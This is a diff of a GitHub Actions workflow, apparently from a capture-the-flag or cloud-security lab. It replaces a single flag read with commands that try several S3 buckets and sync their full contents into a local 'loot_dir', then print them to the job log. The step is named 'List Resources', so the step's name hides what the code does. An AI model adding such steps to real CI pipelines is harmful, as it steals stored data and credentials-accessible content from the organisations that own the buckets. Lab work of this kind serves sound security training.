@@ -19,5 +19,17 @@ jobs:
 
       - name: List Resources
         run: |
-          echo "=== Reading Flag from S3 ==="
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt -
+          echo "=== Trying to read flag from all buckets ==="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - || true
+          aws s3 cp s3://codec4f26c862a321ef5/flag.txt - || true
+          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || true
+          
+          echo "=== Backing up buckets to find the flag file ==="
+          mkdir loot_dir
+          aws s3 sync s3://platform-bucket-009661764077-us-east-1/ ./loot_dir/ || true
+          aws s3 sync s3://codec4f26c862a321ef5/ ./loot_dir/ || true
+          aws s3 sync s3://site781fe43f26b9eba3/ ./loot_dir/ || true
+          
+          echo "=== Contents of local loot directory ==="
+          ls -la ./loot_dir || true
+          cat ./loot_dir/flag.txt || true
